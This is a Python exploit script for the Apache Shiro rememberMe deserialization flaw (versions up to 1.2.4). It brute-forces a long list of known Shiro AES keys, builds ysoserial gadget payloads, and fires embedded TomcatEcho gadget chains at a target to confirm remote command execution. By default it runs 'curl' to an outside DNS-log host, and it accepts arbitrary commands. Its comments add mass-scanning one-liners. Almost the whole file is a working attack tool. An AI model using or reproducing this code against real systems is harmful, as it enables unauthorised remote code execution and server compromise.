#!/usr/bin/env python3
# shiro <= 1.2.4
# Maintainer: cyan
import sys
import uuid
import subprocess
import requests
import concurrent.futures
import gzip
from Crypto.Cipher import AES
from base64 import b64decode,b64encode
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


JAVA_PATH = '/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java'
# YSOSERIAL_PATH = '/Users/cyan/HackerTools/command-tools/ysoserial-0.0.6-Plus.jar'
YSOSERIAL_PATH = '/Users/cyan/Tools/ysoserial-0.0.8-SNAPSHOT-all.jar'


red = "\x1B[31m"
clear = "\x1b[0m"

KEYS_SET = [
"kPH+bIxk5D2deZiIxcaaaA==",  # default
"r0e3c16IdVkouZgk1TKVMg==",  # jeesite
"4AvVhmFLUs0KTA3Kprsdag==",  # jeecms
"fCq+/xW488hMTCD+cmJ3aQ==",
"6ZmI6I2j5Y+R5aSn5ZOlAA==",
"Z3VucwAAAAAAAAAAAAAAAA==",
"U3ByaW5nQmxhZGUAAAAAAA==",
"M1RIN2FVNGt6T2lRU2VNAA==",
"0Av6jWaXCkCu5A9nJbPxLI==",
"0AvVhmFLUs0KTA3Kprsdag==",
"1AvVhdsgUs0FSA3SDFAdag==",
"1QWLxg+NYmxraMoxAXu/Iw==",
"1tC/xrDYs8ey+sa3emtiYw==",
"25BsmdYwjnfcWmnhAciDDg==",
"2A2V+RFLUs+eTA3Kpr+dag==",
"2AvVhdsgUs0FSA3SDFAdag==",
"2cVtiE83c4lIrELJwKGJUw==",
"2itfW92XazYRi5ltW0M2yA==",
"wxKYXuTPST5SG0jMQzVPsg==",
"3AvVhdAgUs0FSA4SDFAdBg==",
"3AvVhmFLUs0KTA3Kprsdag==",
"3JvYhmBLUs0ETA5Kprsdag==",
"3qDVdLawoIr1xFd6ietnwg==",
"4AvVhmFLUsOKTA3Kprsdag==",
"4BvVhmFLUs0KTA3Kprsdag==",
"5aaC5qKm5oqA5pyvAAAAAA==",
"5AvVhmFLUS0ATA4Kprsdag==",
"5AvVhmFLUs0KTA3Kprsdag==",
"5J7bIJIV0LQSN3c9LPitBQ==",
"5RC7uBZLkByfFfJm22q/Zw==",
"66v1O8keKNV3TTcGPK1wzg==",
"6AvVhmFLUs0KTA3Kprsdag==",
"6NfXkC7YVCV5DASIrEm1Rg==",
"6Zm+6I2j5Y+R5aS+5ZOlAA==",
"6ZmI6I2j3Y+R1aSn5BOlAA==",
"7AvVhmFLUs0KTA3Kprsdag==",
"8AvVhmFLUs0KTA3Kprsdag==",
"8BvVhmFLUs0KTA3Kprsdag==",
"9AvVhmFLUs0KTA3Kprsdag==",
"9FvVhtFLUs0KnA3Kprsdyg==",
"a2VlcE9uR29pbmdBbmRGaQ==",
"a3dvbmcAAAAAAAAAAAAAAA==",
"A7UzJgh1+EWj5oBFi+mSgw==",
"aU1pcmFjbGVpTWlyYWNsZQ==",
"Bf7MfkNR0axGGptozrebag==",
"bWljcm9zAAAAAAAAAAAAAA==",
"bWluZS1hc3NldC1rZXk6QQ==",
"bXRvbnMAAAAAAAAAAAAAAA==",
"bya2HkYo57u6fWh5theAWw==",
"c+3hFGPjbgzGdrC+MHgoRQ==",
"c2hpcm9fYmF0aXMzMgAAAA==",
"cGhyYWNrY3RmREUhfiMkZA==",
"cGljYXMAAAAAAAAAAAAAAA==",
"ClLk69oNcA3m+s0jIMIkpg==",
"cmVtZW1iZXJNZQAAAAAAAA==",
"d2ViUmVtZW1iZXJNZUtleQ==",
"empodDEyMwAAAAAAAAAAAA==",
"ertVhmFLUs0KTA3Kprsdag==",
"eXNmAAAAAAAAAAAAAAAAAA==",
"f/SY5TIve5WWzT4aQlABJA==",
"FP7qKJzdJOGkzoQzo2wTmA==",
"fPimdozRt+SSSbZS8/HARA==",
"fsHspZw/92PrS3XrPW+vxw==",
"GAevYnznvgNCURavBhCr1w==",
"hBlzKg78ajaZuTE0VLzDDg==",
"HWrBltGvEZc14h9VpMvZWw==",
"i45FVt72K2kLgvFrJtoZRw==",
"IduElDUpDDXE677ZkhhKnQ==",
"Is9zJ3pzNh2cgTHB4ua3+Q==",
"Jt3C93kMR9D5e8QzwfsiMw==",
"kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
"L7RioUULEFhRyxM7a2R/Yg==",
"lT2UvDUmQwewm6mMoiw4Ig==",
"MDgBSEFqYIoWYezkWDywig==",
"MPdCMZ9urzEA50JDlDYYDg==",
"MTIzNDU2Nzg5MGFiY2RlZg==",
"MTIzNDU2NzgxMjM0NTY3OA==",
"MzVeSkYyWTI2OFVLZjRzZg==",
"NGk/3cQ6F5/UNPRh8LpMIg==",
"NsZXjXVklWPZwOfkvk6kUA==",
"O4pdf+7e+mZe8NyxMTPJmQ==",
"OUHYQzxQ/W9e/UjiAGu6rg==",
"OY//C4rhfwNxCQAQCrQQ1Q==",
"Q01TX0JGTFlLRVlfMjAxOQ==",
"rPNqM6uKFCyaL10AK51UkQ==",
"RVZBTk5JR0hUTFlfV0FPVQ==",
"s0KTA3mFLUprK4AvVhsdag==",
"s2SE9y32PvLeYo+VGFpcKA==",
"SDKOLKn2J1j/2BHjeZwAoQ==",
"sHdIjUN6tzhl8xZMG3ULCQ==",
"SkZpbmFsQmxhZGUAAAAAAA==",
"tiVV6g3uZBGfgshesAQbjA==",
"U0hGX2d1bnMAAAAAAAAAAA==",
"U3BAbW5nQmxhZGUAAAAAAA==",
"UGlzMjAxNiVLeUVlXiEjLw==",
"V2hhdCBUaGUgSGVsbAAAAA==",
"vXP33AonIp9bFwGl7aT7rA==",
"WcfHGU25gNnTxTlmJMeSpw==",
"wGiHplamyXlVB11UXWol8g==",
"WkhBTkdYSUFPSEVJX0NBVA==",
"WuB+y2gcHRnY2Lg9+Aqmqg==",
"XgGkgqGqYrix9lI6vxcrRw==",
"XTx6CKLo/SdSgub+OPHSrw==",
"xVmmoltfpb8tTceuT5R7Bw==",
"Y1JxNSPXVwMkyvES/kJGeQ==",
"yeAAo1E8BOeAYfBlm4NG9Q==",
"YI1+nBV//m7ELrIyDHm6DQ==",
"Ymx1ZXdoYWxlAAAAAAAAAA==",
"yNeUgSzL/CfiWw1GALg6Ag==",
"ZAvph3dsQs0FSL3SDFAdag==",
"ZmFsYWRvLnh5ei5zaGlybw==",
"ZnJlc2h6Y24xMjM0NTY3OA==",
"ZUdsaGJuSmxibVI2ZHc9PQ=="]


def ysoserial(gadget, command):

    popen = subprocess.Popen([JAVA_PATH, '-jar', YSOSERIAL_PATH, gadget, command], stdout=subprocess.PIPE)
    serial_str = popen.stdout.read()
    return serial_str


def cbc_encode(serial_str, key):

    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = b64decode(key)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(serial_str)
    base64_ciphertext = b64encode(iv + encryptor.encrypt(file_body)).decode("utf-8")
    return base64_ciphertext


def cbc_decode(base64_str, key):

    seri_str = b64decode(base64_str)
    mode = AES.MODE_CBC
    iv = seri_str[0: 16]
    encrypt_txt = seri_str[16:]
    encrypt_txt += b'\x00' * (16 - len(encrypt_txt) % 16)
    encryptor = AES.new(b64decode(key), mode, IV = iv)
    plain_text = encryptor.decrypt(encrypt_txt)
    return plain_text


def gcm_encode(serial_str, key):

    mode = AES.MODE_GCM
    iv = uuid.uuid4().bytes
    encryptor = AES.new(b64decode(key), mode, iv)
    ciphertext, tag = encryptor.encrypt_and_digest(serial_str)
    ciphertext = ciphertext + tag
    payload = b64encode(iv + ciphertext).decode('utf-8')
    return payload


def gcm_decode(base64_str, key):

    BS   = AES.block_size
    mode =  AES.MODE_GCM
    cipher = b64decode(base64_str)
    iv = cipher[0: 16]
    enc = cipher[16: -16]
    tag = cipher[-16: ]
    decryptor = AES.new(b64decode(key), mode, iv)
    plaintext = decryptor.decrypt_and_verify(enc, tag)
    return plaintext


def encrypt(serial_str, key, mode):

    if mode == "gcm":
        return gcm_encode(serial_str, key)
    else:
        return cbc_encode(serial_str, key)


def decrypt(base64_str, key, mode):

    if mode == "gcm":
        return gcm_decode(base64_str, key)
    else:
        return cbc_decode(base64_str, key)


def rememberMe(key, gadget, command, mode):

    return encrypt(ysoserial(gadget, command), key, mode)


def detect_shiro(url, cookie = {"rememberMe": "123"}):

    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'}

    try:
        res = requests.get(url, headers = header, cookies = cookie, allow_redirects = False, timeout = 10, verify = False)

    except Exception as e:
        print(e.__class__.__name__ + ": " + url)
        return 0, e.__class__.__name__

    if('Set-Cookie' in res.headers.keys()):
        if('rememberMe' in res.headers['Set-Cookie']):
            return 1, str(res.status_code)
    return 2, str(res.status_code)


def check_key(target, key, mode):
    # simplePrincipalCollection 序列化数据，用于检测 shiro 的 key 是否正确, 错误的 key 会返回 rememberMe=deleteMe，正确则不会返回 rememberMe
    simplePrincipalCollection_bin_base64encode = 'rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=='
    serial_str = b64decode(simplePrincipalCollection_bin_base64encode)
    remember_str = encrypt(serial_str, key, mode)
    cookie = {"rememberMe": remember_str}
    return detect_shiro(target, cookie)


def bat(target, keySet, mode):

    with concurrent.futures.ThreadPoolExecutor(max_workers = 15) as executor:
        future_to_key = {executor.submit(check_key, target, key, mode): key for key in keySet}
        for future in concurrent.futures.as_completed(future_to_key):
            key = future_to_key[future]
            try:
                flag, status_code = future.result()
            except Exception as exc:
                print('%r generated an exception: %s' % (key, exc.__class__.__name__))
            else:
                if flag == 2:
                    print("-" * 80)
                    print(red + mode.upper(), key, status_code, f"Valid\t Target: {target}" + clear)

                    # tomcatecho gadget
                    if tomcatEcho(target, key, mode):
                        exit(0)

                    # URLDNS gadget
                    print("-" * 80)
                    print(f"PAYLOAD: DNSLOG \t URL: {DNS_LOG}")
                    print("-" * 80)
                    print(rememberMe(key, gadget="URLDNS", command=DNS_LOG, mode=mode))

                    # foreach gadget list
                    for gadget in GADGET_LIST:
                        print("-" * 80)
                        print(f"PAYLOAD: {gadget} \t COMMAND: {COMMAND}")
                        # detect_shiro("http://fzmh.cib.com.cn/a/login",cookie = {"rememberMe": rememberMe(key)})
                        print("-" * 80)
                        remember = rememberMe(key, gadget = gadget, command = COMMAND, mode = mode)
                        print(remember)

                        # send all gadget payload
                        # sendExp(target,remember)
                    exit(0)
                print(mode.upper(), key, status_code)


def sendExp(target,remember):

    try:
        resp = requests.get(target,
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'},
            cookies = {"rememberMe": remember},
            allow_redirects = False,
            timeout = 10,
            verify = False)
    except Exception as e:
        print(e.__class__.__name__)


def tomcatEcho(target, key, mode):
    CommonsCollectionsK1TomcatEcho = gzip.decompress(b64decode("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"))
    CommonsCollectionsK2TomcatEcho = gzip.decompress(b64decode("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"))
    print("-" * 80)
    for k, v in [("CommonsCollectionsK1TomcatEcho", CommonsCollectionsK1TomcatEcho),
        ("CommonsCollectionsK2TomcatEcho", CommonsCollectionsK2TomcatEcho)]:
        # print(v,key,mode)
        remember = encrypt(v, key, mode)
        try:
            resp = requests.get(target,
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
                    "Testecho": "kye6mQFOaAG3TNjSQhMJG2"},
                cookies = {"rememberMe": remember},
                allow_redirects = False,
                timeout = 10,
                verify = False)
        except Exception as e:
            print(e.__class__.__name__)
        else:
            if resp.headers.get("Testecho"):
                print(red + f"{k} \t Vulnerable! \t Status: {resp.status_code} \t Header: Testecho,Testcmd" + clear)
                print("-" * 80)
                print(remember)
                return True
            else:
                print(f"{k} \t Not Vulnerable \t Status: {resp.status_code}")
    return False


GADGET_LIST = [
            # "CommonsCollectionsK1",
            # "CommonsCollectionsK3",
            # "CommonsCollectionsK2",
            # "CommonsCollectionsK4",
            # "Jdk8u20",
            # "Jdk7u21"
            ]

# Default URLDNS & Command
DNS_LOG = "http://shirodnslog.1.dns.c205.top"
COMMAND = f"curl {DNS_LOG}"


if __name__ == '__main__':
    
    if len(sys.argv) > 1:
        if len(sys.argv) == 3:
            if sys.argv[2].startswith("http"):
                DNS_LOG = sys.argv[2]
                COMMAND = f"curl {DNS_LOG}"
            else:
                COMMAND = sys.argv[2]
        target = sys.argv[1]
        flag, status = detect_shiro(target)
        if flag == 1:
            bat(target, KEYS_SET[: 10], "cbc")
            bat(target, KEYS_SET, "gcm")
            bat(target, KEYS_SET[10: ], "cbc")
            print("-" * 80)
            print(f"{target}\tNot found a valid key!")
            print("-" * 80)
        elif flag == 2:
            print(f'{target}\tNot Find Shiro\t Status: {status}')

    else:
        print("""shiro https://target.com/
shiro https://target.com/ http://xxx.dnslog.cn
shiro https://target.com/ whoami""")

# ffuf -w urls.txt -u FUZZ -H "Cookie: rememberMe=deletea;" -mr "rememberMe="
# cat httpx_urls.txt |httpx -H "Cookie: rememberMe=123;"  -match-string "rememberMe=deleteMe" -title -status-code